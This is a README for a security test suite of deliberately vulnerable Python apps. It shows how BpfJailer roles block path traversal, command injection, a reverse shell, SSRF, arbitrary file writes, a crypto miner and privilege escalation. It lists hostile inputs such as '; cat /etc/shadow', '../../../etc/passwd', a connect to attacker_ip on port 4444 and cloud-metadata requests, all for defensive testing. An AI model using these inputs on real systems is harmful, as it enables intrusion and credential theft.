# BpfJailer Security Test Suite

This directory contains vulnerable Python applications that demonstrate common security vulnerabilities and how BpfJailer policies can mitigate them.

## Quick Start

```bash
# Start the BpfJailer daemon
cd /root/bpfjail
sudo RUST_LOG=info ./target/release/bpfjailer-daemon &

# Run all tests without jailing (shows vulnerabilities)
sudo python3 tests/vulnerable_apps/run_tests.py

# Run all tests with restricted role (shows mitigation)
sudo python3 tests/vulnerable_apps/run_tests.py --role 1
```

## Available Roles

| Role ID | Name | File | Network | Exec | Best For |
|---------|------|------|---------|------|----------|
| 0 | unenrolled | Allowed | Allowed | Allowed | Baseline comparison |
| 1 | restricted | Blocked | Blocked | Blocked | Maximum security |
| 2 | permissive | Allowed | Allowed | Allowed | Development/testing |
| 3 | webserver | Allowed | Ports 80,443,8080 | Blocked | Web applications |
| 4 | database | Allowed | Ports 5432,6379 | Blocked | Database servers |
| 5 | isolated | Allowed | Blocked | Blocked | Sandboxed processing |

## Vulnerability Test Cases

### 1. Path Traversal (`path_traversal.py`)

**Vulnerability**: Application reads files based on user input without sanitization.

**Attack**: `../../../etc/passwd` → reads system password file

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks all file access |
| permissive | No | Allows file access |
| webserver | Partial | Needs file_paths rules |
| isolated | Partial | Needs file_paths rules |

```bash
# Without jailing - reads /etc/passwd
sudo python3 tests/vulnerable_apps/path_traversal.py

# With restricted role - BLOCKED
sudo python3 tests/vulnerable_apps/run_tests.py --role 1 --test path
```

---

### 2. Command Injection (`command_injection.py`)

**Vulnerability**: Application executes shell commands with user input.

**Attack**: `; cat /etc/shadow` → executes arbitrary commands

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks exec |
| permissive | No | Allows exec |
| webserver | Yes | Blocks exec |
| isolated | Yes | Blocks exec |

```bash
# Without jailing - executes commands
sudo python3 tests/vulnerable_apps/command_injection.py

# With webserver role - BLOCKED
sudo python3 tests/vulnerable_apps/run_tests.py --role 3 --test cmd
```

---

### 3. Reverse Shell (`reverse_shell.py`)

**Vulnerability**: Malware connects back to attacker's server for remote access.

**Attack**: `connect(attacker_ip, 4444)` → establishes reverse shell

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks all network |
| permissive | No | Allows network |
| webserver | Partial | Only allows ports 80,443,8080 |
| isolated | Yes | Blocks all network |

```bash
# Without jailing - connects to any port
sudo python3 tests/vulnerable_apps/reverse_shell.py

# With isolated role - BLOCKED
sudo python3 tests/vulnerable_apps/run_tests.py --role 5 --test shell
```

---

### 4. SSRF (`ssrf.py`)

**Vulnerability**: Application fetches URLs from user input, allowing access to internal services.

**Attack**: `http://169.254.169.254/` → accesses cloud metadata

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks all network |
| permissive | No | Allows network |
| webserver | Partial | Allows port 80 (metadata) |
| isolated | Yes | Blocks all network |

```bash
# Without jailing - accesses internal services
sudo python3 tests/vulnerable_apps/ssrf.py

# With restricted role - BLOCKED
sudo python3 tests/vulnerable_apps/run_tests.py --role 1 --test ssrf
```

---

### 5. Arbitrary File Write (`arbitrary_write.py`)

**Vulnerability**: Application writes files to user-specified paths.

**Attack**: Write to `/etc/cron.d/backdoor` → persistence

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks all file access |
| permissive | No | Allows file access |
| webserver | Partial | Needs file_paths rules |
| isolated | Partial | Needs file_paths rules |

```bash
# Without jailing - writes anywhere
sudo python3 tests/vulnerable_apps/arbitrary_write.py

# With restricted role - BLOCKED
sudo python3 tests/vulnerable_apps/run_tests.py --role 1 --test write
```

---

### 6. Crypto Miner (`crypto_miner.py`)

**Vulnerability**: Malware downloads and executes crypto mining software.

**Attack**: Download miner → Execute → Connect to pool

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks download, exec, pool connection |
| permissive | No | Allows everything |
| webserver | Partial | Blocks exec, blocks pool port |
| isolated | Partial | Blocks download/pool but not exec |

```bash
# Without jailing - full mining capability
sudo python3 tests/vulnerable_apps/crypto_miner.py

# With webserver role - exec and pool blocked
sudo python3 tests/vulnerable_apps/run_tests.py --role 3 --test miner
```

---

### 7. Privilege Escalation (`privilege_escalation.py`)

**Vulnerability**: Malware attempts to gain root privileges.

**Attack**: Read /etc/shadow, write sudoers, spawn shells

**Mitigated By**:
| Role | Mitigated | Reason |
|------|-----------|--------|
| restricted | Yes | Blocks file access, exec |
| permissive | No | Allows everything |
| webserver | Partial | Blocks exec |
| isolated | Partial | Blocks exec |

```bash
# Without jailing - attempts privilege escalation
sudo python3 tests/vulnerable_apps/privilege_escalation.py

# With restricted role - BLOCKED
sudo python3 tests/vulnerable_apps/run_tests.py --role 1 --test privesc
```

## Mitigation Summary Matrix

| Vulnerability | restricted | webserver | isolated | permissive |
|--------------|------------|-----------|----------|------------|
| Path Traversal | BLOCKED | Partial | Partial | Allowed |
| Command Injection | BLOCKED | BLOCKED | BLOCKED | Allowed |
| Reverse Shell | BLOCKED | Partial | BLOCKED | Allowed |
| SSRF | BLOCKED | Partial | BLOCKED | Allowed |
| Arbitrary Write | BLOCKED | Partial | Partial | Allowed |
| Crypto Miner | BLOCKED | BLOCKED | Partial | Allowed |
| Privilege Escalation | BLOCKED | Partial | BLOCKED | Allowed |

## Role Selection Guide

### Use `restricted` (ID 1) when:
- Running untrusted code
- Processing untrusted input
- Maximum security is required

### Use `webserver` (ID 3) when:
- Running web applications
- Need to serve HTTP/HTTPS
- Don't need to spawn subprocesses

### Use `isolated` (ID 5) when:
- Processing files locally
- No network access needed
- Running data transformation tasks

### Use `database` (ID 4) when:
- Running database services
- Need specific port access (5432, 6379)
- Don't need to spawn subprocesses

## Creating Custom Roles

Edit `config/policy.json` to create custom roles:

```json
{
  "roles": {
    "my_app": {
      "id": 10,
      "name": "my_app",
      "flags": {
        "allow_file_access": true,
        "allow_network": true,
        "allow_exec": false
      },
      "network_rules": [
        {"protocol": "tcp", "port": 443, "allow": true},
        {"protocol": "tcp", "port": 8443, "allow": true}
      ]
    }
  }
}
```

## Running Individual Tests

```bash
# List all tests
sudo python3 tests/vulnerable_apps/run_tests.py --list

# Run specific test
sudo python3 tests/vulnerable_apps/run_tests.py --role 1 --test path
sudo python3 tests/vulnerable_apps/run_tests.py --role 3 --test shell
sudo python3 tests/vulnerable_apps/run_tests.py --role 5 --test miner
```

## Expected Output

### Without Jailing (Role 0)
```
TEST: Path Traversal / Arbitrary File Read
SUCCESS - File read (2847 bytes)
root:x:0:0:root:/root:/bin/bash...
```

### With Restricted Role (Role 1)
```
TEST: Path Traversal / Arbitrary File Read
BLOCKED - Permission denied (BpfJailer blocked file access)
```
